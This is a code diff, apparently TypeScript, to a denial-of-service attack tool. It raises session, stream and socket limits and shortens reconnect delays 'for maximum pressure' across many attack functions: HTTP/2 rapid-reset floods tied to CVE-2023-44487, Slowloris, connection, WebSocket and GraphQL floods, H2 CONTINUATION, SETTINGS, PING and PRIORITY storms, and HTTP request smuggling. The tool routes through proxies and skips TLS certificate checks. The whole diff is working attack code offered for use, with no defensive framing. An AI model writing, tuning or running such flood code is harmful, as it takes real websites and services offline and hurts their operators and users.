@@ -1307,12 +1307,13 @@ async function runHTTPPipeline(
   const runConn = async (): Promise<void> => {
     while (!signal.aborted) {
       await oneConn();
-      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 10));
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 1)); // was 10ms
     }
   };
 
   // Each thread maintains one persistent pipelining connection
-  await Promise.all(Array.from({ length: Math.min(threads, 800) }, runConn));
+  // 32GB: 2K pipeline conns × ~100KB = 200MB — trivial headroom
+  await Promise.all(Array.from({ length: Math.min(threads, 2000) }, runConn));
   clearInterval(flushIv);
   clearInterval(poolIv);
   flush();
@@ -1338,10 +1339,10 @@ async function runHTTP2Flood(
   const { connect: h2connect, constants: h2constants } = await import("node:http2");
 
   // 32GB RAM / 8 vCPU optimized: each H2 session ~150KB (V8 + TLS + nghttp2 state)
-  // 800 sessions × 150KB = 120MB — trivial on 32GB. CVE-2023-44487 dominant at 800 concurrent.
-  // Max streams per session raised to 1000 — more RST+PING work forced per session per burst.
-  const STREAMS_PER_SESSION = Math.min(1000, Math.max(32, threads * 3)); // was 512
-  const NUM_SESSIONS        = Math.min(threads, 800);                    // was 500
+  // 2000 sessions × 150KB = 300MB — very comfortable on 32GB.
+  // Streams raised to 2000 per session → 4M concurrent streams possible.
+  const STREAMS_PER_SESSION = Math.min(2000, Math.max(64, threads * 4)); // was 1000
+  const NUM_SESSIONS        = Math.min(threads, 2000);                   // was 800
   const connectTarget       = `https://${resolvedHost}:${targetPort}`;
 
   let localPkts = 0, localBytes = 0;
@@ -1427,8 +1428,8 @@ async function runHTTP2Flood(
         conn.on("close",   () => { resolve(); }); // will restart in next while iteration
         signal.addEventListener("abort", cleanup, { once: true });
       });
-      // Brief pause before reconnect — avoid thundering herd on CF rate limits
-      if (!signal.aborted) await new Promise(r => setTimeout(r, 150 + randInt(0, 100)));
+      // Brief pause before reconnect — minimum delay for maximum pressure
+      if (!signal.aborted) await new Promise(r => setTimeout(r, 10 + randInt(0, 20)));
     }
   };
 
@@ -1463,7 +1464,7 @@ async function runSlowlorisReal(
   const IS_DEV = process.env.NODE_ENV !== "production";
   const MAX_CONN = IS_DEV
     ? Math.min(threads * 8, 800)            // dev: max 800 sockets (~64MB TLS)
-    : Math.min(threads * 120, 50000);       // prod: 50K sockets × 80KB TLS = 4GB (32GB avail)
+    : Math.min(threads * 200, 100000);      // prod: 100K sockets × 80KB TLS = 8GB (32GB avail)
   let localPkts = 0, localBytes = 0, activeConns = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
@@ -1621,7 +1622,7 @@ async function runConnFlood(
   const IS_DEV_CF = process.env.NODE_ENV !== "production";
   const MAX_CONN = IS_DEV_CF
     ? Math.min(threads * 8, 800)            // dev: max 800 sockets (~64MB TLS)
-    : Math.min(threads * 80, 40000);        // prod: 40K TLS sockets × 80KB = 3.2GB
+    : Math.min(threads * 150, 80000);       // prod: 80K TLS sockets × 80KB = 6.4GB (32GB avail)
   let localPkts = 0, localBytes = 0, activeConns = 0, pIdx = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
@@ -2365,7 +2366,7 @@ async function runH2Continuation(
   };
 
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 1000); // 32GB: 1K slots × 150KB = 150MB
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K slots × 150KB = 300MB
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -2592,8 +2593,8 @@ async function runH2SettingsStorm(
   proxies: ProxyConfig[] = [],
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 800); // 32GB: 800 × 100KB = 80MB
-  const OPEN_STREAMS = IS_DEV ? 20 : 100; // PROD: 100 half-open streams × 800 slots = 80K pending streams
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K slots × 100KB = 200MB
+  const OPEN_STREAMS = IS_DEV ? 20 : 200; // PROD: 200 half-open streams × 2K slots = 400K pending streams
 
   const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
     const f = Buffer.allocUnsafe(9 + payload.length);
@@ -2739,7 +2740,7 @@ async function runWSFlood(
   proxies: ProxyConfig[] = [],
 ): Promise<void> {
   const IS_DEV    = process.env.NODE_ENV !== "production";
-  const MAX_CONNS = IS_DEV ? Math.min(threads * 4, 400) : Math.min(threads * 30, 20000); // 32GB: 20K WS × 40KB = 800MB
+  const MAX_CONNS = IS_DEV ? Math.min(threads * 4, 400) : Math.min(threads * 50, 40000); // 32GB: 40K WS × 40KB = 1.6GB
   const useHttps  = targetPort === 443;
 
   const WS_PATHS  = ["/ws", "/websocket", "/socket", "/socket.io/", "/live", "/chat",
@@ -3016,7 +3017,7 @@ async function runGraphQLDoS(
     }
   };
 
-  await Promise.all(Array.from({ length: Math.min(threads, 800) }, () => runThread())); // 32GB: 800 concurrent fragment bombs
+  await Promise.all(Array.from({ length: Math.min(threads, 2000) }, () => runThread())); // 32GB: 2K HPACK bombs × 100KB = 200MB
   clearInterval(flushIv);
   flush();
 }
@@ -3744,8 +3745,8 @@ async function runH2PingStorm(
   // Pre-build 256 PING frames with random opaque data for fast cycling
   const PING_POOL = Array.from({ length: 256 }, () => buildPing());
 
-  let localPkts = 0, localBytes = 0;
-  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  let localPkts = 0, localBytes = 0, localConns = 0;
+  const flush   = () => { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
   const onePingConn = (): Promise<void> => new Promise<void>((resolve) => {
@@ -3758,10 +3759,12 @@ async function runH2PingStorm(
     const done = () => {
       if (settled) return; settled = true;
       if (pingIv) { clearInterval(pingIv); pingIv = null; }
+      localConns = Math.max(0, localConns - 1);
       try { sock.destroy(); } catch { /**/ }
       resolve();
     };
     const startPinging = () => {
+      localConns++;
       // Send preface + initial SETTINGS
       sock.write(Buffer.concat([H2_CLIENT_PREFACE, H2_SETTINGS, H2_SETTINGS_ACK]));
       localPkts++;
@@ -3852,8 +3855,8 @@ async function runHTTPSmuggling(
     ].join("");
   };
 
-  let localPkts = 0, localBytes = 0;
-  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  let localPkts = 0, localBytes = 0, localConns = 0;
+  const flush   = () => { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
   const oneConn = (): Promise<void> => new Promise<void>((resolve) => {
@@ -3865,10 +3868,12 @@ async function runHTTPSmuggling(
     let settled = false;
     const done = () => {
       if (settled) return; settled = true;
+      localConns = Math.max(0, localConns - 1);
       try { sock.destroy(); } catch { /**/ }
       resolve();
     };
     const onConn = () => {
+      localConns++;
       // Send multiple smuggle variants in one keep-alive connection
       for (let i = 0; i < 8; i++) {
         const pkt = Math.random() < 0.5 ? buildSmuggle() : buildSmuggleTE();
@@ -4253,13 +4258,13 @@ async function runH2PriorityStorm(
     0x0,0x4, 0x00,0xFF,0xFF,0xFF, // INITIAL_WINDOW_SIZE=max
   ]);
 
-  let localPkts = 0, localBytes = 0;
+  let localPkts = 0, localBytes = 0, localConns = 0;
   const flushIv = setInterval(() => {
-    if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; }
+    if (localPkts > 0) { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; }
   }, 500);
 
   const oneConn = () => new Promise<void>(resolve => {
-    const done = () => resolve();
+    const done = () => { localConns = Math.max(0, localConns - 1); resolve(); };
     const sock: tls.TLSSocket = tls.connect({
       host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false,
       ALPNProtocols: ["h2"],
@@ -4267,6 +4272,7 @@ async function runH2PriorityStorm(
 
     sock.once("secureConnect", () => {
       if (signal.aborted) { sock.destroy(); return done(); }
+      localConns++;
       sock.write(H2_PREFACE);
       sock.write(H2_SETTINGS);
 
@@ -4301,11 +4307,11 @@ async function runH2PriorityStorm(
   const runSlot = async () => {
     while (!signal.aborted) {
       await oneConn();
-      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 200));
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50)); // was 200ms
     }
   };
   await Promise.all(Array.from({ length: Math.max(10, threads) }, runSlot));
-  clearInterval(flushIv); onStats(localPkts, localBytes);
+  clearInterval(flushIv); onStats(localPkts, localBytes, localConns);
 }
 
 // ─────────────────────────────────────────────────────────────────────────
